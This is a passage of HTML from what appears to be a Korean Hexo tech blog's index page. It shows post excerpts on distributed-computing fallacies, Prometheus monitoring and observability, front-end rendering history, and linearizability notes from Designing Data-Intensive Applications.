</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/25/distributed-architecture-article-01/">distributed-architecture-article-01</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-25</time><div class="content"><p>분산 컴퓨팅의 여덟가지 오류</p>
<ol>
<li>네트워크는 안정적이다.</li>
<li>지연 시간은 0이다.</li>
<li>대역폭은 무한하다.</li>
<li>네트워크에는 보안성이 있다.</li>
<li>토폴로지는 변경되지 않는다.</li>
<li>관리자는 한 명이다.</li>
<li>전송 비용은 0이다.</li>
<li>네트워크는 동질적이다.<br />
<a href="https://queue.acm.org/detail.cfm?id=2499552" target="_blank" rel="noopener">https://queue.acm.org/detail.cfm?id=2499552</a><br />
<a href="http://techblog.netflix.com/2011/07/netflix-simian-army.html" target="_blank" rel="noopener">http://techblog.netflix.com/2011/07/netflix-simian-army.html</a></li>
</ol>
<p>시스템의 디자인은 가능한 한 사람의 작용을 줄이는 방식으로 디자인돼야 하며, 개발에서 배포까지 모든 것이 자동화 돼야 한다.</p>
<p>서비스를 제거하고 재부팅<br />
-&gt; 핵심 전략은 서버 시작시간을 빠르면 몇 밀리초 정도로 빠르게 하는것이다.</p>
<p>애플리케이션은 SLA에 뒤쳐지면서 실행 중이라는 사실을 알 때 부하는 내려 놓아야 한다.</p>
<p>관찰 가능성</p>
<ul>
<li>
<p>시스템 내부 상태를 외부 출력에 대한 지식으로 추측하는 척도이다.</p>
</li>
<li>
<p>각 마이크로서비스의 처리량, 성공/실패한 요청의 수, CPU/메모리/기타 네트워크 리소스의 활용률<br />
비지니스 관련 메트릭</p>
<p>무공유 아키텍처</p>
<ul>
<li>분산 컴퓨팅에서 잘 정립된 원칙</li>
<li>특정 노드가 단순한 무상태를 넘어 디스크 또는 메모리를 다른 노드와 공유하면 안된다.</li>
<li>확장 가능한 시스템은 더 많은 노드 또는 리소스가 시스템에 도입될 때 로드 증가에 따라 처리량을 증가 시킬 수 있어야 한다.</li>
</ul>
<p>로그는 이벤트 스트림으로 처리해야 한다.</p>
</li>
</ul>
<p>원격 측정</p>
<ul>
<li>Application Performance monitoring
<ul>
<li>HTTP 요청 수</li>
<li>데이터베이스 호출 수</li>
<li>각 요청을 처리하는데 걸린 시간</li>
</ul>
</li>
<li>도메인 특화
<ul>
<li>새 주문 수</li>
<li>미결 주문</li>
<li>마감 주문을 날짜별로 포함해서 처리 중인 주문과 관련된 데이터 푸시</li>
</ul>
</li>
<li>상태 및 시스템 로그는
<ul>
<li>서버시작, 종료</li>
<li>메모리 소비 및 CPU 사용률</li>
</ul>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/20/monitoring-prometheus/">monitoring-prometheus</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/monitoring/">monitoring</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/prometheus/">prometheus</a></span><div class="content"><h3 id="prometheus"><a class="markdownIt-Anchor" href="#prometheus"></a> Prometheus</h3>
<ul>
<li>Metric 기반 오픈소스 모니터링 시스템
<ul>
<li>데이터 모델 : Label (key-value time series)</li>
<li>쿼리 언어</li>
<li>CNCF 재단 멤버</li>
<li>Integration Library를 통해 third-party App들 연계 가능</li>
<li>알람 기능</li>
</ul>
</li>
</ul>
<h3 id="모니터링이란"><a class="markdownIt-Anchor" href="#모니터링이란"></a> 모니터링이란</h3>
<ul>
<li>Alerting(알림) : 문제가 발생한 시기나 시점을 파악하는 것이 모니터링에서는 가장 중요하다.</li>
<li>Debugging(디버깅) : 문제의 근본 원인을 규명하고 문제가 무엇이든 간에 반드시 해결해야 한다.</li>
<li>Trending(추세 파악) : 시스템이 어떻게 사용되고 시간에 따라 변화하는지를 확인할 수 있는 기능. Capacity Planning 과 같은 설계 결정과 프로세스에 영향을 미칠 수 있다.</li>
<li>Plumbing(플러밍) : 망치를 가지고 있으면, 모든 것이 못처럼 보이기 시작한다. 데이터 처리 파이프라인으로</li>
</ul>
<h3 id="모니터링의-범주"><a class="markdownIt-Anchor" href="#모니터링의-범주"></a> 모니터링의 범주</h3>
<ul>
<li>HTTP 요청 수신</li>
<li>HTTP 400 응답 송신</li>
<li>entering a function (함수 시작)</li>
<li>leaving a function (함수 종료)</li>
<li>if 문의 else에 도달</li>
<li>사용자 로그인</li>
<li>디스크에 데이터 쓰기</li>
<li>네트워크에서 데이터 읽기</li>
<li>커널에 추가 메모리 요청</li>
<li>모든 이벤트에는 컨텍스트가 있다.
<ul>
<li>HTTP 요청에는 들어오고 나가는 IP주소, 요청 URL 설정된 쿠키, 요청한 사용자 정보가 포함되어있다.</li>
<li>HTTP 응답에는 응답에 걸린 시간, HTTP 상태 코드, 응답 본문의 길이가 있다.</li>
<li>함수를 포함하는 이벤트에는 함수 상단에 있는 함수들의 콜 스택과 HTTP 요청처럼 무엇이 해당 스택의 일부를 트리거 했는지에 대한 정보가 담겨있다.</li>
</ul>
</li>
</ul>
<h3 id="프로파일링"><a class="markdownIt-Anchor" href="#프로파일링"></a> 프로파일링</h3>
<ul>
<li>profiling (프로파일링)은 우리가 모든 시간에 대해 모든 이벤트의 컨텍스트를 가질 수 없지만, 제한된 기간의 일부 컨텍스트를 가질 수 있다는 방식으로 접근한다.</li>
<li>Tcpdump는 프로파일링 도구의 하나로, 지정된 필터를 기반으로 네트워크 트래픽을 기록할 수 있다. Tcpdump는 필수적인 디버깅 도구지만, 실제로는 디스크 공간이 부족해 질수 있다.</li>
<li>리눅스 커널의 eBPF(enhanced Berkeley Packet Filters)는 파일시스템부터 네트워크 기호까지 커널 이벤트에 대해 상세하게 프로파일링을 할 수 있다.</li>
<li>오랜 시간 동안 프로프알링을 해야하는 경우, 다른 모니터링 방법과 함께 사용하려면 <em>반드시</em> 데이터의 양을 줄여야 한다.</li>
</ul>
<h3 id="트레이싱"><a class="markdownIt-Anchor" href="#트레이싱"></a> 트레이싱</h3>
<ul>
<li>tracing(트레이싱)은 모든 이벤트를 살펴보는 것이 아니라, 관심 기능을 통과하는 일부 이벤트 처럼 수백 개의 이벤트 중 특정 이벤트에만 집중한다.</li>
<li>Stack Trace에서 관심 있는 부분의 함수들을 기록하고, 때때로 이러한 함수들이 얼마나 오랫동안 수행되었는지도 기록한다.</li>
<li>트레이싱 시스템 중 일부는 관심 지정에서 스택 트레이스에 스냅샷을 수집하는 대신 관심 있는 함수 하위의 모든 함수 호출을 추적하고 타이밍을 기록한다.</li>
<li>HTTP 요청 중 하나를 샘플링할 수 있고, 이 요청에 대해 데이터베이스나 캐시같은 백엔드와 통신하는 데 얼마나 오랜 시간이 소비되었는지 확인할 수 있다.</li>
<li>Distributed tracing(분산 트레이싱)은 한단계 더 나아가 원격 프로시저 호출에서 다른 프로세스로 전달되는 요청에 고유 ID 를 추가해 해당 요청이 추적되어야 하는지 여부등 프로세스 전반에 걸친 작업을 추적한다.</li>
<li>트레이싱에서 데이터 볼륭 유지 및 계측 성능에 영향을 미치는 것은 sampling(샘플링)이다.</li>
</ul>
<h3 id="로깅"><a class="markdownIt-Anchor" href="#로깅"></a> 로깅</h3>
<ul>
<li>logging은 제한된 이벤트 집합을 살펴보고 각 이벤트에 대한 컨텍스트 일부를 기록한다.</li>
<li>로깅의 장점은 이벤트에 대한 샘플링이 없다는 점이다. 따라서 필드 개수를 제한하더라도, 시간이 오래 걸리는 요청이 특정 API 엔드포인트와 통신하는 특정 유저에게 얼마나 영향을 미치는지를 판단해야 한다.</li>
</ul>
<h4 id="로깅의-범주"><a class="markdownIt-Anchor" href="#로깅의-범주"></a> 로깅의 범주</h4>
<ul>
<li>Transaction Logs(트랜잭션 로그) : 어떠한 대가를 치르더라도 영원히 안전하게 보관해야 하는 중요한 비지니스 기록이다.<br />
주로 비용과 연관된 기능이나 사용자가 직접 사용하는 주요 기능이 트랜잭션 로그에 속한다.</li>
<li>Request logs(요청 로그) : 모든 HTTP 요청이나 데이터베이스 호출을 track(추적)하는 경우의 로그다.<br />
요청 로그는 사용자가 직접 사용하는 기능이나 내부 최적화의 구현에 쓰인다. 대부분은 요청 로그가 삭제되는 것을 바라지 않겠지만, 그렇다고 로그 중 일부를 잃는다고 해서 큰 문제가 되진 않는다.</li>
<li>Application Logs(애플리케이션 로그) : 모든 로그가 요청 로그인 것은 아니며, 프로세스 그 자체에 관한 로그도 있다. 시작 메시지, 백그라운드 유지보수 작업, 프로세스 수준의 로그<br />
주로 사람들이 직접 읽기 때문에 정상적인 동작에서 1분당 몇 개 정도가 적절하다.</li>
<li>Debug Logs(디버그 로그) : 디버그 로그는 굉장히 상세해서 생성과 저장에 비용이 많이 든다. 협소한 디버깅 상황에서만 사용되며, 데이터의 양 때문에 프로파일링의 특성을 띈다.</li>
</ul>
<h3 id="메트릭"><a class="markdownIt-Anchor" href="#메트릭"></a> 메트릭</h3>
<ul>
<li>metric(메트릭)은 컨텍스트를 대부분 무시하고 다양한 유형의 이벤트에 대해 시간에 따른 aggregation(집계)을 추적한다. 자원 사용을 정상적으로 유지하려면, 추적하는 메트릭의 개수를 제한해야한다.</li>
<li>프로세스당 1만개의 메트릭 처리정도가 합리적인 상한선 일 것이다.</li>
<li>metric을 이용하면 애플리케이션의 각 서브시스템에서의 대기 시간과 처리하는 데이터양을 추적해서 성능 저하의 원인이 정확히 무엇인지 손쉽게 알아낼 수 있다.</li>
<li>어떤 서브시스템에 문제의 원인이 있는지 찾아낸 다음, 로그를 통해 해당 문제에 관련된 사용자 요청을 정확하게 파악할 수 있다.</li>
<li>메트릭은 프로세스 전반에 걸쳐 이벤트 정보를 수집할 수 있지만, 일반적으로 카디널리티가 제한된 컨텍스트는 1~2개 이상의 필드를 갖지 않는다.</li>
<li>로그는 한 가지 유형 이벤트에 대해 모든 정보를 수집할 수 있지만, 카디널리티가 제한되지 않은 컨텍스트에 대해 수백 개 필드만 추적할 수 있다.</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/13/exchange-ready-april/">exchange-ready-april</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-13</time><div class="content"><h1 id="철이-없었죠-front-end-를-우습게-봤다는게"><a class="markdownIt-Anchor" href="#철이-없었죠-front-end-를-우습게-봤다는게"></a> 철이 없었죠… Front-End 를 우습게 봤다는게</h1>
<h1 id="front-end-역습"><a class="markdownIt-Anchor" href="#front-end-역습"></a> Front-end 역습</h1>
<h2 id="front-end-project-어떻게-시작하나"><a class="markdownIt-Anchor" href="#front-end-project-어떻게-시작하나"></a> Front-end Project 어떻게 시작하나?</h2>
<pre><code>##  Jquery를 썼다는건
</code></pre>
<h2 id="browser를-이해하면-front-end가-보인다"><a class="markdownIt-Anchor" href="#browser를-이해하면-front-end가-보인다"></a> Browser를 이해하면 Front-end가 보인다.</h2>
<ul>
<li>
<p>Dom Tree, CSS OM</p>
</li>
<li>
<p>Layout, Painting</p>
</li>
<li>
<p>javascript로 화면을 조작을 하면, Reflow와 Repainting이 일어나서 성능이 저하된다<br />
–&gt; 그래서 사람들이 Vue를 제어할때 onReady Event에 모아서 한번에 처리했었다.</p>
</li>
<li>
<p>SSR에서 SPA가 나온 이유</p>
<ul>
<li>정적 리소스 다운로드에 대한 비용</li>
<li>Ajax의 등장</li>
<li>패러다임 시프트가 일어나 Client Side Rendering 으로 전환</li>
<li>Client가 무거워짐</li>
<li>이를 잘 관리하기 위해 Framework들이 등장</li>
<li>Programming Model이 복잡해짐</li>
<li>view - data bind 양방향 선택
<ul>
<li>특정상황에서 느려짐</li>
</ul>
</li>
<li>이러한 부분에 대한것을 해결하기 위해 Virtual DOM을 쓰는 React의 등장</li>
<li>Flux Architecture 등장</li>
<li>React 와 VueJS 등장</li>
</ul>
</li>
<li>
<p>SPA --&gt; SSR로 다시</p>
<ul>
<li>SEO</li>
<li>Meta Tag들</li>
</ul>
</li>
<li>
<p>Static Page Generator</p>
</li>
<li>
<p>예전에 좋았는데 왜 지금 안좋아지는가?</p>
</li>
<li>
<p>HTTP2</p>
</li>
<li>
<p>Image Sprite</p>
</li>
<li>
<p>Protocol</p>
</li>
<li>
<p>HTTP</p>
</li>
</ul>
<h2 id="추가로-알면-좋은-것들-etc"><a class="markdownIt-Anchor" href="#추가로-알면-좋은-것들-etc"></a> 추가로 알면 좋은 것들 etc)</h2>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/designing-data-intensive-application-9/">designing-data-intensive-application-9</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><div class="content"><h3 id="데이터-일관성과-합의"><a class="markdownIt-Anchor" href="#데이터-일관성과-합의"></a> 데이터 일관성과 합의</h3>
<ul>
<li>분산 시스템에서는 내부 구성 요소 중 뭔가에 결함이 있더라도 서비스는 올바르게 동작할 방법을 찾아야 한다.</li>
<li>내결합성을 지닌 시스템을 구축하는 가장 좋은 방법은 유용한 보장을 해주는 범용 추상화를 찾아 이를 구현하고 애플리케이션에서 이 보장에 의존하게 하는 것이다.</li>
<li>분산 시스템에 가장 중요한 추상화 중 하나는 합의, 즉 모든 노드가 어떤 것에 동의하게 만드는 것이다.</li>
</ul>
<h3 id="일관성-보장"><a class="markdownIt-Anchor" href="#일관성-보장"></a> 일관성 보장</h3>
<ul>
<li>복제 데이터베이스는 대부분 최소한 최종적 일관성을 제공한다. (쓰기를 멈추고 불특정 시간 동안 기다리면 결국 모든 읽기 요청이 같은 값을 반환한다는 뜻이다.)</li>
<li>불일치는 일시적이며 결국 스스로 해소한다. 모든 복제본이 결국 같은 값으로 수렴되기를 기대하므로 최종적 일관성보다 수렴이 더 나은 이름일지도 모른다.</li>
<li>그러나 언제 복제본이 수렴될지에 대해서는 아무것도 이야기 하지 않는다.</li>
<li>최종적 일관성은 보통 단일 스레드 프로그램에 있는 변수 동작과 매우 다르므로 애플리케이션 개발자는 주의를 요한다.</li>
</ul>
<h3 id="선형성"><a class="markdownIt-Anchor" href="#선형성"></a> 선형성</h3>
<ul>
<li>최종적 일관성을 지닌 데이터베이스에서 두 개의 다른 복제본에 같은 질문을 동시에 하면 두 가지 다른 응답을 받을지도 모른다.
<ul>
<li>데이터 베이스가 본제본이 하나만 있다는 환상을 만들어 준다면 훨씬 더 단순 해지지 않을까? 그러면 모든 클라이언트는 똑같은 데이터를 보고 복제 지연을 걱정할 필요가 없다.</li>
</ul>
</li>
<li>위의 아이디어가 선형성을 뒷받침하는 아이디어다.
<ul>
<li>atomic consistency (원자적 일관성)</li>
<li>strong consistency (강한 일관성)</li>
<li>immediate consistency (즉각 일관성)</li>
<li>external consistency (외부 일관성)</li>
</ul>
</li>
<li>recency guarantee(최신성 보장) : 최근에 갱신된 값이며 뒤처진 캐시나 복제본에서 나온 값이 아니라고 보장<br />
<img src="/images/data-intensive/chapter_9/nonlinear_action.png" alt="" /></li>
<li>밥과 앨리스는 서로 다른 결과를 본다 (선형성 위반)</li>
</ul>
<h3 id="시스템에-선형성을-부여하는-것은-무엇인가"><a class="markdownIt-Anchor" href="#시스템에-선형성을-부여하는-것은-무엇인가"></a> 시스템에 선형성을 부여하는 것은 무엇인가?</h3>
<p><img src="/images/data-intensive/chapter_9/register.png" alt="" /></p>
<ul>
<li>선형 데이터베이스에서 동시에 같은 키 x를 읽고 쓰는 세 클라이언트를 보여준다. 분산 시스템 분야에서 x는 register(레지스터)라고 불린다.
<ul>
<li>현실에서는 키-값 저장소의 키 하나, 관계형 데이터베이스의 로우 하나, 또는 문서 데이터베이스의 문서 하나가 될 수 있다.</li>
</ul>
</li>
<li>이 예제에서 레지스터는 두 가지 종류 연산이 있다.
<ul>
<li>read(x) =&gt; v는 클라이언트가 레지스터 x의 값을 읽기를 요청했고 데이터베이스가 값 v를 반환했다는 것을 의미한다.</li>
<li>write(x) =&gt; v은 클라이언트가 레지스터 x의 값을 v로 설정하라고 요청했고 데이터베이스가 응답r(ok or error)을 반환했다는 것을 의미한다.</li>
</ul>
</li>
<li>실행되는 동안 클라이언트 A와 B는 최신 값을 읽기 위해 반복적으로 데이터베이스를 폴링한다. A와 B는 자신의 읽기 요청에 대해 어떤 응답을 받을 수 있을까?
<ul>
<li>A의 첫 연산은 0을 반환하는 것이 명백하다</li>
<li>A의 마지막 읽기 연산은 쓰기가 완료된 후 시작하므로 데이터베이스가 선형적이라면 명백히 새로운 값 1을 반환해야 한다. 쓰기는 쓰기 연산의 시작과 끝 사이의 어느 시점에선가 처리됐어야 하고 읽기는 읽기 연산의 시작과 끝 사이의 어느 시점에선가 처리 됐어야 한다. 만약 쓰기가 끝난 후에 읽기가 시작하면 그 읽기는 쓰기 후에 처리됐어야 하고 따라서 새로 쓰여진 값을 볼 수 있어야 한다.</li>
<li>쓰기 연산과 시간이 겹치는 읽기 연산은 0을 반환했을 수도 1을 반환했을 수도 있다. 읽기 연산이 처리되는 시점에 쓰기의 영향이 발생했는지 아닌지 알 수 없기 때문이다. 이 연산들은 쓰기와 동시에 실행된다.</li>
</ul>
</li>
<li>시스템을 선형적으로 만들려면 또 다른 제약조건을 추가해야 한다.<br />
<img src="/images/data-intensive/chapter_9/register_constraint.png" alt="" /></li>
<li>선형성 시스템에서 우리는 x의 값이 원자적으로 0에서 1로 바뀌는 어떤 시점이 있어야 한다고 상상한다. 따라서 한 클라이언트의 읽기가 새로운 값 1을 반환하면 이후의 모든 읽기 또한 새로운 값을 반환해야 한다.
<ul>
<li>A는 새로운 값 1을 읽은 첫번째 클라이언트다. A의 읽기가 반환된 후 바로 B가 새로운 읽기를 시작한다. B의 읽기는 확실히 A의 읽기 뒤에 실행되므로 C가 실행한 쓰기가 아직 진행 중이라도 역시 1을 반환해야 한다.</li>
<li>하나의 연산을 더 추가한다.
<ul>
<li>cas(x, v_old, v_new) =&gt; r 은 클라이언트가 atomic compare-and-set 연산을 요청했다는 뜻이다. 레지스터 x의 현재 값이 v_old와 같으면 원자적으로 v_new로 설정돼야 한다. X != v_old 라면 이 연산은 레지스터를 그대로 두고 오류를 반환해야 한다. r(ok or error)은 데이터베이스의 응답이다.<br />
<img src="/images/data-intensive/chapter_9/register_cas.PNG" alt="" /></li>
</ul>
</li>
<li>클라이언트 B가 X 읽기 요청을 보낸 후 클라이언트 D가 x를 0으로 설정하는 요청을 보내고 클라이언트 A가 x를 1로 설정하는 요청을 보낸다. 그렇지만 B의 읽기가 반환한 값은 1이다. 이것은 문제가 없으며 데이터베이스가 D의 쓰기를 먼저 처리한 수 A의 쓰기를 처리했고 마지막으로 B의 읽기를 처리했다는 의미다. 요청을 보낸 순서와는 다르지만 세 요청이 동시적이기 때문에 이는 허용된다.</li>
<li>클라이언트 B의 읽기는 클라이언트 A가 데이터베이스로부터 값을 1로 쓰는 데 성공했다는 응답을 받기 전에 1을 반환했다. 이것도 괜찮다. 값이 쓰여지기 전에 읽혔다는 의미가 아니라 데이터베이스에서 클라이언트 A로 가는 ok응답이 네트워크에서 약간 지연됐다는 의미이다.</li>
<li>이 모델은 어떤 트랜잭션 격리도 가정하지 않는다. 다른 클라이언트가 언제라도 값을 바꿀지 모른다. 예를 들어 C는 먼저 1을 읽고 그 다음에는 2를 읽었는데, 두 번의 읽기 사이에 B가 값을 변경했기 때문이다. 다른 클라이언트가 동시에 값을 바꾸지 않았는지 확인하기 위해 atomic compare and set 연산을 쓸 수 있다. B와 C의 cas 요청은 성공하지만 D의 cas 요청은 실패다 (데이터베이스가 그 요청을 처리하는 시점에 x의 값은 더 이상 0이 아니다.)</li>
<li>클라이언트 B의 마지막 읽기는 선형적이지 않다. 이 연산은 x를 2에서 4로 갱신하는 C의 cas 쓰기와 동시적이다. 다른 요청이 없다면 B의 읽기가 2를 반환해도 괜찮다. 그러나 클라이언트 A는 B의 읽기가 시작하기 전에 이미 새로운 값 4를 읽었다. 따라서 B는 A가 읽은 것보다 과거의 값을 읽는 것은 허용되지 않는다.</li>
</ul>
</li>
</ul>
<h3 id="선형성-대-직렬성"><a class="markdownIt-Anchor" href="#선형성-대-직렬성"></a> 선형성 대 직렬성</h3>
<ul>
<li>직렬성
<ul>
<li>모든 트랜잭션이 여러 객체(로우, 문서, 레코드)를 읽고 쓸 수 있는 상황에서의 트랜잭션들의 격리 속성이다. 직렬성은 트랜잭션이 어떤 순서에 따라 실행되는 것처럼 동작하도록 보장해준다. 그 순서가 트랜잭션들이 실제로 실행되는 순서와 달라도 상관없다.</li>
</ul>
</li>
<li>선형성
<ul>
<li>레지스터(개볍 객체)에 실행되는 읽기와 쓰기에 대한 최신성 보장이다. 선형성은 연산을 트랜잭션으로 묶지 않아서 충돌 구체와 같은 부가적인 수단을 사용하지 않으면 쓰기 스큐 같은 문제를 막지 못한다.</li>
</ul>
</li>
<li>데이터베이스는 직렬성과 선형성을 모두 제공할 수도 있으며 이런 조합은 strict serializability (엄격한 직렬성)이나 strong one-copy serializability, strong-1SR(강한 단일 복사본 직렬성)이라고 한다.
<ul>
<li>2단계 잠금(2PL)이나 실제적인 직렬실행을 기반으로 한 직렬성 구현은 보통 선형적이다.</li>
</ul>
</li>
<li>그러나 직렬성 스냅숏 격리(SSI)는 선형적이지 않다. SSI 는 읽는 쪽이나 쓰는 쪽 사이의 잠금 경쟁을 피하기 위해 일관된 스냅숏에서 읽는다. 요점은 스냅숏에 스냅숏보다 나중에 실행된 쓰기를 포함하지 않는다는 것이고 따라서 스냅숏에서 읽으면 선형적이지 않다.</li>
</ul>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By GwangHui Park</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script src="/js/katex.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>